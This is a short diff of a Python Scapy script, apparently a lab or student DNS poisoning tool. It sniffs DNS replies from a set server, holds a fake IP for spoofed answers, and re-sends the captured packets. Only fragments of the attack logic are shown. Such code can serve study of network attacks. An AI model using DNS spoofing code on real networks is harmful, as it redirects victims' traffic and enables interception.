@@ -8,7 +8,7 @@ DNS_IP='192.168.43.186'
 DELAY=1
 FAKE_IP='54.229.142.49'
 
-
+#not in use
 def generate_response( pck):
 
     resp = IP(dst=pck[IP].src, id=pck[IP].id)\
@@ -34,7 +34,7 @@ def edit_response(pcks):
             pass
         print(pck.show())
 
-        send(generate_response(pck), loop=0,count=2)
+        send(pck,count=3)
 
 def dns_poisoning():
     sniff(prn=edit_response,filter='udp src port 53 and host '+DNS_IP,store=3,count=12)
@@ -52,6 +52,7 @@ def main():
     s.start()
 
     s.join()
+    t.join()
     
 #    sniff(prn=send_response,filter=is_dns_query)
 if __name__=='__main__':
